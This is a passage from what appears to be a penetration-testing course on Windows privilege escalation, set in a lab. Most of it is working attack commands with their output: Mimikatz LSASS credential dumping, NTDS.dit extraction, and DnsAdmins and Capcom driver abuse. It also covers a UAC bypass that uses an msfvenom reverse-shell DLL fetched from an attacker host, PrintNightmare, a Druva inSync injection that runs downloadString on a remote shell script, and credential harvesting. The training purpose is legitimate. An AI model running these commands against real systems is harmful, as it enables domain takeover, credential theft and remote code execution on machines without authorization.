After obtaining the LSASS dump we load it in Mimikatz using the sekurlsa::minidump command. After issuing the sekurlsa::logonPasswords command we gain the NTLM hash of user accounts logged on locally. We can use this to perform a pass-the-hash attack to move laterally if the same local administrator password is used on one or multiple additional systems which is common in large organizations. It is always a good idea to type log before running any commands in Mimikatz so all command output will be saved to a .txt file. This is especially useful when dumping credentials from a server which may have many sets of credentials in memory.

```cmd
C:\htb> mimikatz.exe

mimikatz # log
Using ''mimikatz.log'' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : ''lsass.dmp''

mimikatz # sekurlsa::logonpasswords
Opening : ''lsass.dmp'' file for minidump...

Authentication Id : 0 ; 23026942 (00000000:015f5cfe)
Session           : RemoteInteractive from 2
User Name         : jordan
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
        msv :
         [00000003] Primary
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * NTLM     : cf3a5525ee9414229e66279623ed5c58
         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
```

If we are unable to load tools on the target but have RDP access we can take a manual memory dump of the LSASS process via the Task Manager by browsing to the Details tab, choosing the LSASS process, and selecting Create dump file. After downloading this file back to our attack system we can process it using Mimikatz the same way as above.

---

## Remote Code Execution as SYSTEM via SeDebugPrivilege

We can also leverage SeDebugPrivilege for RCE as SYSTEM. Using a technique where we launch a child process and use the elevated rights granted to our account to alter normal system behavior to inherit the token of a parent process and impersonate it. If we target a parent process running as SYSTEM such as winlogon.exe and specify its Process ID then we can elevate our rights quickly. First open an elevated PowerShell console, run tasklist to get a listing of running processes and PIDs, then use a PoC script to create a process from the parent SYSTEM process. We target winlogon.exe running under a known PID which we know runs as SYSTEM on Windows hosts.

```powershell
PS C:\htb> tasklist

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          4 K
System                           4 Services                   0        116 K
winlogon.exe                   612 Console                    1     10,408 K
```

Using the PoC script with winlogon.exe PID 612 spawns a cmd.exe running as NT AUTHORITY\SYSTEM.

---

## SeTakeOwnershipPrivilege

SeTakeOwnershipPrivilege grants a user the ability to take ownership of any securable object meaning Active Directory objects, NTFS files and folders, printers, registry keys, services, and processes. This privilege assigns WRITE_OWNER rights over an object meaning the user can change the owner within the object''s security descriptor. Administrators are assigned this privilege by default. While it is rare to encounter a standard user account with this privilege we may encounter a service account that is tasked with running backup jobs and VSS snapshots assigned this privilege. Abusing this privilege is a bit of an edge case but it is worth understanding in-depth especially since we may find ourselves in a scenario in an Active Directory environment where we can assign this right to a specific user we can control and leverage it to read a sensitive file on a file share.

---

## Leveraging SeTakeOwnershipPrivilege

First we review our current user''s privileges and enable SeTakeOwnershipPrivilege using a PowerShell script. Then we choose a target file, take ownership of it using the takeown Windows binary, modify the file ACL using icacls to grant ourselves full permissions, and finally read the file contents.

```powershell
PS C:\htb> whoami /priv

Privilege Name                Description                                              State
============================= ======================================================= ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled

PS C:\htb> Import-Module .\Enable-Privilege.ps1
PS C:\htb> .\EnableAllTokenPrivs.ps1
PS C:\htb> whoami /priv

Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
```

Now we take ownership of the target file:

```powershell
PS C:\htb> takeown /f ''C:\Department Shares\Private\IT\cred.txt''

SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\htb-student".
```

Grant ourselves full permissions:

```powershell
PS C:\htb> icacls ''C:\Department Shares\Private\IT\cred.txt'' /grant htb-student:F

processed file: C:\Department Shares\Private\IT\cred.txt
Successfully processed 1 files; Failed processing 0 files
```

Read the file:

```powershell
PS C:\htb> cat ''C:\Department Shares\Private\IT\cred.txt''

NIX01 admin

root:n1X_p0wer_us3er!
```

After performing these changes we would want to make every effort to revert the permissions and file ownership. Take great care when performing potentially destructive actions like changing file ownership as it could cause an application to stop working or disrupt users.

---

## Files of Interest for SeTakeOwnership

Some local files worth targeting include:

```
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

We may also come across .kdbx KeePass database files, OneNote notebooks, files such as passwords.*, pass.*, creds.*, scripts, other configuration files, and virtual hard drive files that we can target to extract sensitive information.

---

# Part 4: Windows Built-in Groups — Backup Operators, Event Log Readers, DnsAdmins, Hyper-V Administrators, Print Operators & Server Operators

---

## Windows Built-in Groups

Windows servers and especially Domain Controllers have a variety of built-in groups that either ship with the operating system or get added when the Active Directory Domain Services role is installed. Many of these groups confer special privileges on their members and some can be leveraged to escalate privileges on a server or a Domain Controller. Accounts may be assigned to these groups to enforce least privilege and avoid creating more Domain Admins and Enterprise Admins to perform specific tasks such as backups. Sometimes vendor applications will also require certain privileges which can be granted by assigning a service account to one of these groups. Accounts may also be added by accident or leftover after testing. We should always check these groups and include a list of each group''s members as an appendix in our report.

---

## Backup Operators

Membership of the Backup Operators group grants SeBackup and SeRestore privileges. The SeBackupPrivilege allows us to traverse any folder and list the folder contents. This will let us copy a file from a folder even if there is no access control entry for us in the folder''s access control list. However we cannot do this using the standard copy command. Instead we need to programmatically copy the data making sure to specify the FILE_FLAG_BACKUP_SEMANTICS flag. We use a PoC with special DLL libraries to exploit this.

First we import the libraries and enable the privilege:

```powershell
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll

PS C:\htb> Get-SeBackupPrivilege
SeBackupPrivilege is disabled

PS C:\htb> Set-SeBackupPrivilege
PS C:\htb> Get-SeBackupPrivilege
SeBackupPrivilege is enabled
```

Now we can copy protected files that we normally cannot access:

```powershell
PS C:\htb> dir C:\Confidential\

    Directory: C:\Confidential

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/6/2021   1:01 PM             88 2021 Contract.txt

PS C:\htb> cat ''C:\Confidential\2021 Contract.txt''
cat : Access to the path ''C:\Confidential\2021 Contract.txt'' is denied.

PS C:\htb> Copy-FileSeBackupPrivilege ''C:\Confidential\2021 Contract.txt'' .\Contract.txt
Copied 88 bytes

PS C:\htb> cat .\Contract.txt
Inlanefreight 2021 Contract
==============================
Board of Directors:
<...SNIP...>
```

---

## Attacking a Domain Controller — Copying NTDS.dit

This group also permits logging in locally to a domain controller. The active directory database NTDS.dit is a very attractive target as it contains the NTLM hashes for all user and computer objects in the domain. However this file is locked and is also not accessible by unprivileged users. As the NTDS.dit file is locked by default we can use the Windows diskshadow utility to create a shadow copy of the C drive and expose it as E drive. The NTDS.dit in this shadow copy will not be in use by the system.

```powershell
PS C:\htb> diskshadow.exe

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```

Next we copy the NTDS.dit file from the shadow copy and back up the SAM and SYSTEM registry hives:

```powershell
PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
Copied 16777216 bytes
```

```cmd
C:\htb> reg save HKLM\SYSTEM SYSTEM.SAV
The operation completed successfully.

C:\htb> reg save HKLM\SAM SAM.SAV
The operation completed successfully.
```

---

## Extracting Credentials from NTDS.dit

With the NTDS.dit extracted we can use secretsdump.py or the PowerShell DSInternals module to extract all Active Directory account credentials. These can then be used for pass-the-hash to access additional resources or cracked offline using Hashcat.

```bash
$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a05824b8c279f2eb31495a012473d129:::
htb-student:1103:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
```

The built-in utility robocopy can also be used to copy files in backup mode with the /B flag. This eliminates the need for any external tools:

```cmd
C:\htb> robocopy /B E:\Windows\NTDS .\ntds ntds.dit

   ROBOCOPY     ::     Robust File Copy for Windows

   Source : E:\Windows\NTDS\
     Dest : C:\Tools\ntds\
    Files : ntds.dit

   Files :         1         1         0         0         0         0
   Bytes :   16.00 m   16.00 m         0         0         0         0
```

---

## Event Log Readers

If auditing of process creation events and corresponding command line values is enabled this information is saved to the Windows security event log as event ID 4688. Organizations may enable logging of process command lines to help defenders monitor and identify possibly malicious behavior. Administrators or members of the Event Log Readers group have permission to access this log. If users or administrators run commands with credentials on the command line such as net use with /user and a password those credentials get logged and we can search for them.

```powershell
PS C:\htb> wevtutil qe Security /rd:true /f:text | Select-String "/user"

        Process Command Line:   net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

We can also specify alternate credentials for wevtutil using the /u and /p parameters. For Get-WinEvent the syntax filters for process creation events containing /user in the process command line. Note that searching the Security event log with Get-WinEvent requires administrator access or adjusted registry permissions. Membership in just the Event Log Readers group is not sufficient.

```powershell
PS C:\htb> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like ''*/user*''} | Select-Object @{name=''CommandLine'';expression={ $_.Properties[8].Value }}

CommandLine
-----------
net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

---

## DnsAdmins

Members of the DnsAdmins group have access to DNS information on the network. The Windows DNS service supports custom plugins and can call functions from them to resolve name queries. The DNS service runs as NT AUTHORITY\SYSTEM so membership in this group can potentially be leveraged to escalate privileges on a Domain Controller. It is possible to use the built-in dnscmd utility to specify the path of the plugin DLL. The attack involves generating a malicious DLL, loading it using dnscmd, and restarting the DNS service to execute the DLL as SYSTEM.

First generate a malicious DLL:

```bash
$ msfvenom -p windows/x64/exec cmd=''net group "domain admins" netadm /add /domain'' -f dll -o adduser.dll
```

Load the DLL as a member of DnsAdmins. Non-privileged users will get an ACCESS_DENIED error:

```cmd
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

You must specify the full path to the DLL or the attack will not work properly. After stopping and starting the DNS service the DLL will be loaded and the command will execute:

```cmd
C:\htb> sc stop dns

SERVICE_NAME: dns
        STATE              : 3  STOP_PENDING

C:\htb> sc start dns

SERVICE_NAME: dns
        STATE              : 2  START_PENDING

C:\htb> net group "Domain Admins" /dom

Members
-------------------------------------------------------------------------------
Administrator            netadm
The command completed successfully.
```

After the attack always clean up by deleting the ServerLevelPluginDll registry key and restarting DNS:

```cmd
C:\htb> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
Delete the registry value ServerLevelPluginDll (Yes/No)? Y
The operation completed successfully.

C:\htb> sc.exe start dns

SERVICE_NAME: dns
        STATE              : 4  RUNNING
```

This is a potentially destructive attack that should only be carried out with explicit permission from and in coordination with the client since it could potentially take down DNS for an entire Active Directory environment.

Another way to abuse DnsAdmins group privileges is by creating a WPAD record. Disabling the global query block list and creating a WPAD record pointing to our attack machine causes every machine running WPAD with default settings to have its traffic proxied through our attack machine allowing us to capture password hashes:

```powershell
PS C:\htb> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
PS C:\htb> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

---

## Hyper-V Administrators

The Hyper-V Administrators group has full access to all Hyper-V features. If Domain Controllers have been virtualized then the virtualization admins should be considered Domain Admins because they could easily create a clone of the live Domain Controller and mount the virtual disk offline to obtain the NTDS.dit file. It is also documented that upon deleting a virtual machine vmms.exe attempts to restore the original file permissions on the corresponding .vhdx file and does so as NT AUTHORITY\SYSTEM without impersonating the user. We can delete the .vhdx file and create a native hard link to point this file to a protected SYSTEM file which we will have full permissions to.

The practical attack targets an application on the server that has installed a service running as SYSTEM startable by unprivileged users such as the Mozilla Maintenance Service:

```cmd
C:\htb> takeown /F "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

C:\htb> sc.exe start MozillaMaintenance
```

Replace the maintenanceservice.exe with a malicious binary and start the service to get command execution as SYSTEM. Note that this vector has been mitigated by the March 2020 Windows security updates which changed behavior relating to hard links.

---

## Print Operators

Print Operators is another highly privileged group which grants its members the SeLoadDriverPrivilege, rights to manage printers on a Domain Controller, and the ability to log on locally to a DC and shut it down. The SeLoadDriverPrivilege allows loading and unloading device drivers which run as highly privileged code. We can exploit this by loading the vulnerable Capcom.sys driver which contains functionality to allow any user to execute shellcode with SYSTEM privileges.

First add a registry reference to the driver and load it:

```cmd
C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
The operation completed successfully.

C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
The operation completed successfully.

C:\htb> EnableSeLoadDriverPrivilege.exe

whoami:
INLANEFREIGHT0\printsvc
SeLoadDriverPrivilege            Enabled
NTSTATUS: 00000000, WinError: 0
```

Then use ExploitCapcom to pop a SYSTEM shell:

```powershell
PS C:\htb> .\ExploitCapcom.exe

[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000070
[*] Shellcode was placed at 0000024822A50008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
```

Clean up by deleting the registry key afterward. Note that since Windows 10 Version 1803 the SeLoadDriverPrivilege is not exploitable as it is no longer possible to include references to registry keys under HKEY_CURRENT_USER.

---

## Server Operators

The Server Operators group allows members to administer Windows servers without needing Domain Admin privileges. It is a very highly privileged group that can log in locally to servers including Domain Controllers. Membership confers the powerful SeBackupPrivilege and SeRestorePrivilege and the ability to control local services with SERVICE_ALL_ACCESS which gives full read and write control. The attack involves modifying a service binary path to execute our command then starting the service.

```cmd
C:\htb> sc qc AppReadiness

SERVICE_NAME: AppReadiness
        START_TYPE         : 3   DEMAND_START
        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
        SERVICE_START_NAME : LocalSystem

C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
[SC] ChangeServiceConfig SUCCESS

C:\htb> sc start AppReadiness
[SC] StartService FAILED 1053:
The service did not respond to the start or control request in a timely fashion.

C:\htb> net localgroup Administrators

Members
-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
server_adm
The command completed successfully.
```

From here we have full control over the Domain Controller and can retrieve all credentials from the NTDS database:

```bash
$ secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
```

---

# Part 5: User Account Control, Weak Permissions, Kernel Exploits & Vulnerable Services

---

## User Account Control

User Account Control (UAC) is a feature that enables a consent prompt for elevated activities. Applications have different integrity levels and a program with a high level can perform tasks that could potentially compromise the system. When UAC is enabled applications and tasks always run under the security context of a non-administrator account unless an administrator explicitly authorizes them to have administrator-level access. It is a convenience feature that protects administrators from unintended changes but is not considered a security boundary.

The default RID 500 administrator account always operates at the high mandatory level. With Admin Approval Mode enabled any new admin accounts we create will operate at the medium mandatory level by default and be assigned two separate access tokens upon logging in. This means even though a user is in the administrators group they will not have full privileges in a non-elevated console.

To confirm if UAC is the problem we check if we are in the Administrators group but only have basic privileges:

```cmd
C:\htb> net localgroup administrators

Members
-------------------------------------------------------------------------------
Administrator
mrb3n
sarah
The command completed successfully.

C:\htb> whoami /priv

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

We are admin but only see 5 basic privileges. UAC is restricting our token. Confirm UAC settings:

```cmd
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

    EnableLUA    REG_DWORD    0x1

C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```

The value 0x1 means UAC is enabled and 0x5 means the highest UAC level Always Notify is set. We check the Windows build version to find applicable UAC bypasses:

```powershell
PS C:\htb> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

Build 14393 corresponds to Windows release 1607. We can use technique number 54 from the UACME project which targets the 32-bit version of SystemPropertiesAdvanced.exe. This binary attempts to load the non-existent DLL srrstr.dll. The DLL search order means Windows looks in the application directory first. The WindowsApps folder in the user''s profile is writable by the user and is in PATH.

Generate a malicious DLL, download it to the target''s WindowsApps directory, start a listener, and execute the auto-elevating binary:

```bash
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
```

```powershell
PS C:\htb> curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

```cmd
C:\htb> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

The elevated reverse shell comes back with all admin privileges:

```bash
$ nc -lvnp 8443

connect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 50273

C:\Windows\system32>whoami /priv

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
```

UAC bypassed. All admin privileges are now available.

---

## Weak Permissions

Permissions on Windows systems are complicated and challenging to get right. A slight modification in one place may introduce a flaw elsewhere. The permissions-related flaws are relatively uncommon in software from large vendors but are common in third-party software from smaller vendors, open-source software, and custom applications. Services usually install with SYSTEM privileges so leveraging a service permissions-related flaw can often lead to complete control over the target system. We should always check for weak permissions and be able to do it both with the help of tools and manually.

---

## Permissive File System ACLs

We can use SharpUp from the GhostPack suite to check for service binaries suffering from weak ACLs and then verify with icacls. If BUILTIN\Users or Everyone has Full (F) control over the service binary we can replace it with a malicious binary:

```powershell
PS C:\htb> .\SharpUp.exe audit

=== Modifiable Service Binaries ===

  Name             : SecurityService
  DisplayName      : PC Security Management Service
  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"

PS C:\htb> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
                                                     Everyone:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
```

BUILTIN\Users and Everyone both have Full Control. Replace the binary and start the service.

---

## Weak Service Permissions

If a service has weak permissions where Authenticated Users have SERVICE_ALL_ACCESS we can change its binary path to execute our commands:

```cmd
C:\htb> accesschk.exe /accepteula -quvcw WindscribeService

WindscribeService
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS

C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
[SC] ChangeServiceConfig SUCCESS

C:\htb> sc stop WindscribeService
C:\htb> sc start WindscribeService

[SC] StartService FAILED 1053:

C:\htb> net localgroup administrators

Members
-------------------------------------------------------------------------------
Administrator
htb-student
mrb3n
The command completed successfully.
```

Always clean up by reverting the binary path and restarting the service:

```cmd
C:\htb> sc config WindscribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
[SC] ChangeServiceConfig SUCCESS

C:\htb> sc start WindscribeService
```

---

## Unquoted Service Path

When a service binary path contains spaces and is not enclosed in quotes Windows attempts to locate the binary by splitting the path at each space. We can search for unquoted paths and potentially place a malicious executable at one of the intermediate paths:

```cmd
C:\htb> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

System Explorer Service  SystemExplorerHelpService  C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe  Auto
```

However creating files in the root of the drive or the Program Files folder requires administrative privileges so this is often not directly exploitable without another misconfiguration.

---

## Kernel Exploits

Over the years there have been many kernel exploits affecting Windows operating systems from Windows 2000/XP up to Windows 10/Server 2019. Newer Windows versions have fewer known kernel exploits due to security improvements. Important kernel exploits to know include MS08-067 (remote code execution in the Server service affecting older Windows), MS17-010 EternalBlue (remote code execution via SMBv1 affecting Windows XP through Server 2016), CVE-2021-36934 HiveNightmare also known as SeriousSam (Windows 10 flaw allowing any user to read the SAM, SYSTEM, and SECURITY registry hives), and CVE-2021-1675/CVE-2021-34527 PrintNightmare (flaw in the Print Spooler service affecting every supported version of Windows).

---

## HiveNightmare — CVE-2021-36934

This Windows 10 flaw results in ANY user having rights to read the Windows registry and access sensitive information regardless of privilege level. Check if vulnerable by examining the SAM file permissions:

```cmd
C:\htb> icacls c:\Windows\System32\config\SAM

C:\Windows\System32\config\SAM BUILTIN\Administrators:(I)(F)
                               NT AUTHORITY\SYSTEM:(I)(F)
                               BUILTIN\Users:(I)(RX)
```

BUILTIN\Users having (I)(RX) means the system is vulnerable. Run the exploit to create copies of the registry hives:

```powershell
PS C:\htb> .\HiveNightmare.exe

HiveNightmare v0.6 - dump registry hives as non-admin users
Running...
Success: SAM hive from 2021-08-07 written out to current working directory as SAM-2021-08-07
Success: SECURITY hive from 2021-08-07 written out to current working directory as SECURITY-2021-08-07
Success: SYSTEM hive from 2021-08-07 written out to current working directory as SYSTEM-2021-08-07
```

Transfer these files to the attack host and extract password hashes:

```bash
$ impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local

[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
mrb3n:1001:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
htb-student:1002:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
```

---

## PrintNightmare — CVE-2021-1675

PrintNightmare affects the Print Spooler service which runs as SYSTEM by default on Domain Controllers, Windows 7 and 10, and is often enabled on Windows servers. Check if the Spooler service is running:

```powershell
PS C:\htb> ls \\localhost\pipe\spoolss

    Directory: \\localhost\pipe

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
                                                  spoolss
```

Bypass execution policy, import and run the exploit:

```powershell
PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process
PS C:\htb> Import-Module .\CVE-2021-1675.ps1
PS C:\htb> Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"

[+] created payload at C:\Users\htb-student\AppData\Local\Temp\nightmare.dll
[+] added user hacker as local administrator
[+] deleting payload

PS C:\htb> net user hacker

Local Group Memberships      *Administrators
```

Adding a user is noisy and we would not want to do this on an engagement where stealth is a consideration. Check with the client to ensure account creation is in scope.

---

## Vulnerable Services — Druva inSync Example

Third-party applications installed on Windows systems can provide privilege escalation opportunities even when the OS itself is well-patched. We enumerate installed applications, find Druva inSync 6.6.3 which has a known command injection vulnerability via an exposed RPC service running as SYSTEM on port 6064:

```cmd
C:\htb> wmic product get name

Name
Druva inSync 6.6.3

C:\htb> netstat -ano | findstr 6064

  TCP    127.0.0.1:6064         0.0.0.0:0              LISTENING       3324
```

The PoC PowerShell script connects to the local RPC service and injects a command that runs as SYSTEM. We modify the $cmd variable to download a reverse shell and execute it:

```powershell
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString(''http://10.10.14.3:8080/shell.ps1'')"
```

Start a listener, execute the PoC, and receive a SYSTEM shell:

```bash
$ nc -lvnp 9443

listening on [any] 9443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.7] 58611

PS C:\WINDOWS\system32>whoami
nt authority\system
```

---

# Part 6: DLL Injection, Credential Hunting, Further Credential Theft, Citrix Breakout, Interacting with Users & Pillaging

---

## DLL Injection

DLL injection is a method that involves inserting code structured as a Dynamic Link Library into a running process. This allows the inserted code to run within the process''s context thereby influencing its behavior or accessing its resources. DLL injection finds legitimate applications such as hot patching but cybercriminals often manipulate it to insert malicious code into trusted processes for evading detection. There are several methods including LoadLibrary which uses the Windows LoadLibrary API, Manual Mapping which avoids the monitored LoadLibrary function, Reflective DLL Injection where the library loads itself from memory, and DLL Hijacking which exploits the Windows DLL loading search order.

---

## DLL Hijacking

DLL Hijacking exploits the Windows DLL loading process. When Safe DLL Search Mode is enabled which is the default, applications search for DLLs in this order: the application directory, the system directory, the 16-bit system directory, the Windows directory, the current directory, and the directories in the PATH environment variable. If we can identify a DLL the target is attempting to load but cannot find we can place our own DLL in a searched location. We identify missing DLLs using Process Monitor by filtering for CreateFile operations with a result of NAME NOT FOUND on .dll files. We can then create our own DLL that executes arbitrary code and place it in the application directory.

Two attack approaches exist — DLL Proxying where we create a proxy DLL that loads the original function and tampers with it, and Invalid Libraries where we replace a DLL the application cannot find with our own malicious DLL.

---

## Credential Hunting

Credentials can unlock many doors for us during assessments. We may find credentials during privilege escalation enumeration that can lead directly to local admin access, grant us a foothold into the Active Directory domain environment, or be used to escalate privileges within the domain. Applications often store passwords in cleartext config files against best practices. The easiest and fastest credential find is checking PowerShell history which is saved starting with PowerShell 5.0 at C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt.

```powershell
PS C:\htb> gc (Get-PSReadLineOption).HistorySavePath

dir
cd Temp
md backups
wevtutil qe Application "/q:*[Application [(EventID=3005)]]" /f:text /rd:true /u:WEB02\administrator /p:5erv3rAdmin! /r:WEB02
```

The admin ran wevtutil with cleartext credentials on the command line. Check ALL users'' history files at once:

```powershell
PS C:\htb> foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

Search for passwords in config files:

```powershell
PS C:\htb> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

Check Windows AutoLogon for cleartext passwords in the registry:

```cmd
C:\htb> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    htb-student
    DefaultPassword    REG_SZ    HTB_@cademy_stdnt!
```

Check for saved credentials with cmdkey:

```cmd
C:\htb> cmdkey /list

    Target: LegacyGeneric:target=TERMSRV/SQL01
    Type: Generic
    User: inlanefreight\bob
```

Use saved credentials with runas:

```powershell
PS C:\htb> runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

Check for WiFi passwords:

```cmd
C:\htb> netsh wlan show profile
C:\htb> netsh wlan show profile ilfreight_corp key=clear

    Key Content            : ILFREIGHTWIFI-CORP123908!
```

Run LaZagne to extract all stored passwords:

```powershell
PS C:\htb> .\lazagne.exe all

########## User: jordan ##########

------------------- Winscp passwords -----------------
[+] Password found !!!
URL: transfer.inlanefreight.local
Login: root
Password: Summer2020!

------------------- Credman passwords -----------------
[+] Password found !!!
URL: dev01.dev.inlanefreight.local
Login: jordan_adm
Password: ! Q A Z z a q 1
```

Check Sticky Notes database for passwords:

```powershell
PS C:\htb> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap

Text
----
\id=de368df0-6939-4579-8d38-0fda521c9bc4 vCenter
\id=1a44a631-6fff-4961-a4df-27898e9e1e65 root:Vc3nt3R_adm1n!
```

---

## Interacting with Users

When other privilege escalation methods are exhausted we can target users directly. Placing malicious SCF files on heavily accessed file shares forces Windows Explorer to initiate SMB connections to our machine allowing us to capture NTLMv2 hashes. Create a file named @Inventory.scf with an IconFile pointing to our SMB server, start Responder, place it on a file share, and wait for a user to browse the share:

```bash
$ sudo responder -wdv -I tun0

[SMB] NTLMv2-SSP Client   : 10.129.43.30
[SMB] NTLMv2-SSP Username : WINLPE-SRV01\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::WINLPE-SRV01:815c504e7b06ebda:afb6d3b195be...

$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt

ADMINISTRATOR::WINLPE-SRV01:815c504e7b06ebda:afb6d3b195be...:Welcome1
Status...........: Cracked
```

On Server 2019 SCF files no longer work but .lnk files achieve the same effect.

---

# Part 7: Miscellaneous Techniques, Legacy Operating Systems, Windows Server & Desktop Case Studies & Windows Hardening

---

## Miscellaneous Techniques — LOLBAS

